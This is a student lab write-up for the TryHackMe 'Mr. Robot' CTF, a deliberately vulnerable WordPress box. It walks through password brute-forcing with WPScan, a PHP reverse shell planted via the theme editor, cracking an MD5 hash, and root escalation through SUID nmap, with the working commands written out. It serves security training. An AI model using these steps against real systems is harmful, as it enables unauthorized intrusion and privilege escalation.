# Week 12 Lab — TryHackMe: Mr. Robot CTF

> **Submission date:** ~2025-03-31 · **Large Lab deliverable, Week 12**
> **Room:** [TryHackMe — Mr. Robot CTF](https://tryhackme.com/room/mrrobot) · **Difficulty:** Medium
> **Category:** WordPress enumeration + exploitation, Linux privilege escalation

Themed on the USA Network TV show *Mr. Robot*, this room asks the tester to capture three keys (`key-1-of-3.txt`, `key-2-of-3.txt`, `key-3-of-3.txt`) on a misconfigured WordPress box.

## Methodology

1. **Reconnaissance** → Nmap port scan
2. **Web enumeration** → directory brute-forcing, `robots.txt` inspection
3. **CMS enumeration** → WordPress user discovery
4. **Credential attack** → username confirmation + password brute-force
5. **Exploitation** → authenticated PHP payload upload → reverse shell
6. **Post-exploitation** → credential reuse, hash cracking
7. **Privilege escalation** → SUID `nmap` interactive mode (older box) or equivalent

## Target Information

| Field | Value |
|---|---|
| Target IP | Ephemeral TryHackMe IP |
| Attacker | Kali Linux on VirtualBox |

---

## Step 1 — Port Scan

```bash
sudo nmap -sC -sV -p- <target>
```

**Open ports:**
- 22/tcp (SSH, filtered in some variants)
- 80/tcp (HTTP / Apache)
- 443/tcp (HTTPS)

**Finding:** single attack surface — HTTP/HTTPS.

---

## Step 2 — Initial Web Reconnaissance

Visiting `http://<target>/` presents a themed Mr. Robot terminal interface with the `fsociety` branding. Several commands in the UI reveal narrative flavor but little structural exposure.

**Check robots.txt:**
```bash
curl http://<target>/robots.txt
```

**Contents:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Finding:** `key-1-of-3.txt` is immediately readable:
```bash
curl http://<target>/key-1-of-3.txt
```

**First key captured.**

`fsocity.dic` is also downloadable — a large dictionary file (~858,000 lines, many duplicates). This is the intended password wordlist.

```bash
wget http://<target>/fsocity.dic
# Deduplicate to make brute-force feasible
sort -u fsocity.dic > fsocity_unique.dic
wc -l fsocity_unique.dic   # ~11,450 unique lines
```

---

## Step 3 — Directory Brute-Force

```bash
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
```

**Notable discoveries:**
- `/wp-admin` → WordPress admin login redirect
- `/wp-login.php` → login form
- `/wp-content/` → WP content (plugins/themes/uploads)
- `/license.txt` → WordPress license (fingerprint confirms WordPress)

**Finding:** WordPress confirmed. Pivot to WordPress-specific enumeration.

---

## Step 4 — WordPress User Enumeration

**Tool:** WPScan
```bash
wpscan --url http://<target>/ --enumerate u,p,t
```

Alternatively, WordPress's login error messages leak usernames:

- Submitting `admin` with wrong password → "The password you entered for the username admin is incorrect."
- Submitting `doesnotexist` with any password → "Invalid username."

**Result:** `elliot` is a valid username (themed to the show's protagonist).

---

## Step 5 — Password Brute-Force

**Tool:** WPScan (or Hydra)

```bash
wpscan --url http://<target>/ \
  --usernames elliot \
  --passwords fsocity_unique.dic
```

**Outcome:** password discovered in `fsocity_unique.dic` — `ER28-0652` (Elliot's employee ID in the show).

**Login:** `elliot` / `ER28-0652`

---

## Step 6 — Authenticated Exploitation — PHP Payload Upload

**Method:** WordPress admin → Appearance → Editor → overwrite a theme file (e.g., `404.php`) with a PHP reverse shell.

**Payload source:** `/usr/share/webshells/php/php-reverse-shell.php`

Edit to set `$ip` to attacker IP and `$port` to listener port.

**Listener:**
```bash
nc -lvnp 4444
```

**Trigger payload:**
```bash
curl http://<target>/wp-content/themes/<theme>/404.php
```

**Outcome:** reverse shell received as `daemon` (low-privilege www user).

**Shell upgrade:**
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on attacker:
stty raw -echo; fg; reset
```

---

## Step 7 — Second Key Discovery

Navigate filesystem looking for user homes:
```bash
ls -la /home
# user: robot
ls -la /home/robot
```

**Finding:**
- `key-2-of-3.txt` — readable only by `robot` user (we are `daemon`)
- `password.raw-md5` — readable to us, contains a username and MD5 password hash

**Crack the hash:**
```bash
# Copy hash to attacker
echo 'c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
```

**Cracked:** `abcdefghijklmnopqrstuvwxyz` (the alphabet).

**Switch user:**
```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

**Read second key:**
```bash
cat /home/robot/key-2-of-3.txt
```

**Second key captured.**

---

## Step 8 — Privilege Escalation via SUID nmap

**SUID enumeration:**
```bash
find / -perm -4000 2>/dev/null
```

**Finding:** `/usr/local/bin/nmap` has the SUID bit set.

**This is a known privilege escalation:** older Nmap versions supported `--interactive` mode, which allowed spawning a shell that inherited Nmap's privileges.

```bash
nmap --interactive
nmap> !sh
# root shell
```

Alternative (if `--interactive` not supported) — Nmap NSE scripts run as the SUID owner:
```bash
echo 'os.execute("/bin/sh")' > /tmp/shell.nse
nmap --script /tmp/shell.nse
```

---

## Step 9 — Third Key

```bash
cat /root/key-3-of-3.txt
```

**Third key captured. Room complete.**

---

## Tool Summary

| Tool | Purpose |
|---|---|
| **Nmap** | Port discovery, SUID binary identification |
| **curl / wget** | robots.txt inspection, file download |
| **Gobuster** | Directory brute-forcing |
| **WPScan** | WordPress user enumeration + password brute-force |
| **php-reverse-shell.php** | Reverse shell payload for authenticated RCE |
| **netcat** | Reverse shell listener |
| **John the Ripper** | MD5 hash cracking |
| **GTFOBins** | `nmap --interactive` escalation reference |

---

## Key Learnings

1. **WordPress is the single most-targeted CMS in the world.** WP-specific tooling (WPScan) finds exposures generic tools miss.
2. **Don't leak wordlists.** `fsocity.dic` being downloadable told the attacker exactly what passwords to try.
3. **Wordlist deduplication matters.** The original had ~858k lines; unique was ~11.5k — a 75× speedup for no loss of coverage.
4. **Theme editor = RCE.** WordPress admins can edit PHP — any admin compromise is a code-execution compromise.
5. **Password reuse is universal.** The MD5 for `robot` was published; the user's password was trivially guessable.
6. **SUID nmap is ancient news.** Older Nmap versions had `--interactive`; modern versions removed it. But NSE script execution still works as the SUID owner.

---

## Mapping to OWASP Top 10

| Finding | OWASP category |
|---|---|
| fsocity.dic downloadable | **A05 Security Misconfiguration** |
| WordPress user enum leakage | **A07 Auth Failures** |
| Weak password (dictionary) | **A07 Auth Failures** |
| Theme editor unrestricted | **A01 Broken Access Control** |
| Unsalted MD5 password storage | **A02 Cryptographic Failures** |
| SUID nmap | **A05 Misconfiguration** |

---

_Walkthrough back-reference:_ [Course README](../README.md) · [Midterm: Pickle Rick](midterm-pickle-rick.md) · [Final: Boiler CTF](final-boiler-ctf.md)
